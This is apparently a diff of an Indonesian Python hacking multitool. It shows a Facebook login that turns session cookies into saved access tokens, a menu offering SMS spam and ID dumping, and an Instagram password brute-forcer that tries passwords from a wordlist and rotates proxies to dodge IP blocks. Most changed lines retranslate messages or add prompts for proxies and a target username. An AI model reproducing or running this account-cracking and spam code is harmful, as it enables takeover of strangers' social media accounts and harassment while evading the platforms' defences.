@@ -4,9 +4,6 @@
 
 #Import Importan
 import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
-import requests, sys, threading, time, os, random
-from random import randint
-from six.moves import input
 from time import sleep
 from rich import pretty
 from rich.tree import Tree
@@ -272,7 +269,7 @@ def login():
 		
 def login_lagi334():
 	try:
-		cetak(nel('Pake Cookie Yang Masih Fresh Biar Gacor',width=90,style=f"bold red"))
+		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
 		your_cookies = input(' [+] Masukan Cookie : ')
 		with requests.Session() as r:
 			try:
@@ -320,7 +317,7 @@ def login_lagi334():
 							print(f"\n [+] Token : {access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							os.system("xdg-open https://www.facebook.com/profile.php?id=100053626245325&mibextid=ZbWKwL")
+							os.system("xdg-open https://https://web.facebook.com/profile.php?id=100053626245325")
 							print("\n [+] Login Berhasil | python demon.py");followdong()
 			except Exception as e:
 				print(" [+] Cookies Expired")
@@ -329,6 +326,7 @@ def login_lagi334():
 				time.sleep(3)
 				exit()
 	except:pass
+
 
 def followdong():
 	try:
@@ -396,7 +394,7 @@ def menu(my_name,my_id):
 	elif _____demonlord___27____ in ['sms','SMS','Sms']:
 		spam_sms()
 	elif _____demonlord___27____ in ['intsa','instagram','INSTA', 'INSTAGRAM','Insta','Insta']:
-		demonintsa()
+		insta()
 	elif _____demonlord___27____ in ['dump id','dump','Dump ID','Dump Id','DUMP ID']:
 		dumpid()
 	elif _____demonlord___27____ in ['X','logout','x']:
@@ -2564,8 +2562,17 @@ class sxp_wa:
 
 
 #===================================[Instagram]=====================================================
-import socket
+
+
+import requests
+import sys
+import argparse
 import datetime
+import json
+import random
+import time
+import socket
+import os
 
 
 def get_user_agent():
@@ -2812,12 +2819,12 @@ def custom_proxy(verbose, file_proxies, proxy_limit):
 
 def print_login_failed(password, verbose, proxy, proxies, login_response_status_code):
     if proxy:
-        printit("["+str(proxies['http'])+"] Kata Sandi Salah (incorrect pwd: "+password+")", coledt=[1, 49, 93], hide=True, verbose_mode=verbose)
+        printit("["+str(proxies['http'])+"] Login failed (incorrect pwd: "+password+")", coledt=[1, 49, 93], hide=True, verbose_mode=verbose)
     else:
-        printit("["+str(login_response_status_code)+"] Kata Sandi Salah (incorrect pwd: "+password+")", coledt=[1, 49, 93], hide=True, verbose_mode=verbose)
-import argparse
+        printit("["+str(login_response_status_code)+"] Login failed (incorrect pwd: "+password+")", coledt=[1, 49, 93], hide=True, verbose_mode=verbose)
 
-def main():
+
+def insta():
     # Taking command line arguments using argparse
     parser = argparse.ArgumentParser(description='(s41r4j:igbf)> Instagram Brute Forcer')
     parser.add_argument('-u', '--username', help='instagram username (*required)', metavar='USERNAME')
@@ -2831,12 +2838,17 @@ def main():
     args = parser.parse_args()
 
     # Assigning the arguments to variables
-    username = input("[+] Username  : ")
+    proski = input("pake proxy manual apa kagaa  : ")
+    if proski == 'y':
+        proxy = True
+        proxy_file = input("Masukan Proxy / file proxy")
+    else:
+        proxy = False
+        proxy_file = False
+    username = input("kanjut")
     wordlist = 'pw.txt'
     timeout = args.timeout
-    verbose = 'True'
-    proxy = args.proxy
-    proxy_file = args.proxy_file
+    verbose = True
     proxy_limit = args.proxy_limit
 
     if proxy_file:
@@ -2858,6 +2870,7 @@ def main():
     printit("| |_| |  _| | |   | |", coledt=[1, 49, 91])
     printit("|  _  | |___| |___| |_", coledt=[1, 49, 91])
     printit("|_| |_|_____|_____|_____|", coledt=[1, 49, 91], line_down=True)
+
     # Checking if the arguments have been passed
     if username is None or wordlist is None:
         parser.print_help()
@@ -2876,16 +2889,16 @@ def main():
         raise KeyboardInterrupt()
 
     # Displaying the information
-    printit(get_public_ip(), coledt=[1, 49, 96], normaltxt_start='[+] IP Lu      : ')
-    printit("DemonLord27", coledt=[1, 49, 91], normaltxt_start='[+] Author     : ')
-    printit('https://github.com/DemonLord27', coledt=[1, 49, 96], normaltxt_start='[+] Github     : ', line_down=True)
+    printit(get_public_ip(), coledt=[1, 49, 96], normaltxt_start='[+] Public IP  : ')
+    printit("dictionary attack", coledt=[1, 49, 96], normaltxt_start='[+] Attack Type: ')
+    printit('https://github.com/s41r4j/igbf', coledt=[1, 49, 91], normaltxt_start='[+] Github     : ', line_down=True)
     printit(str(username), coledt=[1, 49, 96], normaltxt_start='[+] Username   : ')
-    printit(str(wordlist), coledt=[1, 49, 96], normaltxt_start='[+] FilePw     : ')
+    printit(str(wordlist), coledt=[1, 49, 96], normaltxt_start='[+] Wordlist   : ')
     printit(str(timeout), coledt=[1, 49, 96], normaltxt_start='[+] Timeout    : ')
-    #printit((str(proxy) if proxy else "False"), coledt=[1, 49, 96], normaltxt_start='[+] Proxy      : ')
-    #if proxy_file: printit(str(proxy_file), coledt=[1, 49, 96], normaltxt_start='[+] Proxy file : ')
-    #if proxy: printit((str(proxy_limit)), coledt=[1, 49, 96], normaltxt_start='[+] Limit proxy: ')
-    #printit(str(verbose), coledt=[1, 49, 96], normaltxt_start='[+] Verbose    : ', line_down=True)
+    printit((str(proxy) if proxy else "False"), coledt=[1, 49, 96], normaltxt_start='[+] Proxy      : ')
+    if proxy_file: printit(str(proxy_file), coledt=[1, 49, 96], normaltxt_start='[+] Proxy file : ')
+    if proxy: printit((str(proxy_limit)), coledt=[1, 49, 96], normaltxt_start='[+] Limit proxy: ')
+    printit(str(verbose), coledt=[1, 49, 96], normaltxt_start='[+] Verbose    : ', line_down=True)
 
     # Opening the wordlist
     try:
@@ -2914,11 +2927,11 @@ def main():
                 printit('\n[!] Enter y/Y for YES or n/N for NO', coledt=[1, 49, 91])
 
     # Starting the brute force
-    printit('\n[+] Mulai Prosess Crack\n', coledt=[1, 49, 93])
+    printit('\n[#] Starting the brute force...\n', coledt=[1, 49, 91])
 
     # print start time for calculating total time taken
     start_time = datetime.datetime.now()
-    if verbose: printit(f'[+] Mulai Crack Di Jam {start_time.strftime("%I:%M:%S %p")}\n', coledt=[1, 49, 96])
+    if verbose: printit(f'[+] Started @ {start_time.strftime("%I:%M:%S %p")}\n', coledt=[1, 49, 93])
 
     # printing timeout, if changed from default
     if verbose and timeout != 2: printit(f'[+] Time delay between each attempt: {timeout} secs\n', coledt=[1, 49, 93])
@@ -2976,13 +2989,13 @@ def main():
 
         # Checking if the request returned 403 (temporary ip block/username not found)
         if login_response.status_code == 403 or login_response.status_code == "403":
-            printit("\n["+str(login_response.status_code)+"]: Spam Ip Terdeteksi", coledt=[4, 49, 91])
+            printit("\n["+str(login_response.status_code)+"]: Temporary IP BLOCKED, wait for few minutes", coledt=[4, 49, 91])
             if verbose:
-                printit("["+str(login_response.status_code)+"]: Pake Vpn Atau Proxy", coledt=[4, 49, 91])
-                printit("["+str(login_response.status_code)+"]: Build Trus Rotate Proxynya", coledt=[4, 49, 91])
-                printit("["+str(login_response.status_code)+"]: Atau Pake Proxy Manual", coledt=[4, 49, 91])
-                printit("["+str(login_response.status_code)+"]: Timeout coeggg\n", coledt=[4, 49, 91])
-            printit("["+str(login_response.status_code)+"]: Jan Lupa Username Nya Harus Bener", coledt=[4, 49, 91], line_down=True)
+                printit("["+str(login_response.status_code)+"]: You can also use proxy/VPN (change active vpn server)", coledt=[4, 49, 91])
+                printit("["+str(login_response.status_code)+"]: To avoid this use built-in IP rotating proxy (-p/--proxy)", coledt=[4, 49, 91])
+                printit("["+str(login_response.status_code)+"]: OR use custom proxy file for IP rotating (-f/--proxy-file)", coledt=[4, 49, 91])
+                printit("["+str(login_response.status_code)+"]: Timeout between each request can also help (-t/--timeout)\n", coledt=[4, 49, 91])
+            printit("["+str(login_response.status_code)+"]: Also check if the USERNAME entered is available", coledt=[4, 49, 91], line_down=True)
             sys.exit()
 
         # login_response -> json format
@@ -2991,7 +3004,7 @@ def main():
         # Checking if the username is exists
         try:
             if json_data["user"] == False:
-                printit(password, coledt=[7, 49, 97], normaltxt_start="\n[#] Login Berhasil (pwd)> ")
+                printit(password, coledt=[7, 49, 97], normaltxt_start="\n[#] Login successful (pwd)> ")
                 sys.exit()
         except SystemExit:
             sys.exit()
@@ -3032,10 +3045,11 @@ def main():
 
     # print end time for calculating total time taken
     end_time = datetime.datetime.now()
-    if verbose: printit(f'\n\n[+] Berhenti Di Jam {end_time.strftime("%I:%M:%S %p")}', coledt=[1, 49, 93])
+    if verbose: printit(f'\n\n[+] Ended @ {end_time.strftime("%I:%M:%S %p")}', coledt=[1, 49, 93])
 
     # Calculating the total time taken
-    printit(f'\n[+] Crack Berhasil {end_time - start_time} (H:M:S)', coledt=[1, 49, 91], line_down=True)
+    printit(f'\n[+] Brute force completed in: {end_time - start_time} (H:M:S)', coledt=[1, 49, 91], line_down=True)
+
 
 
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
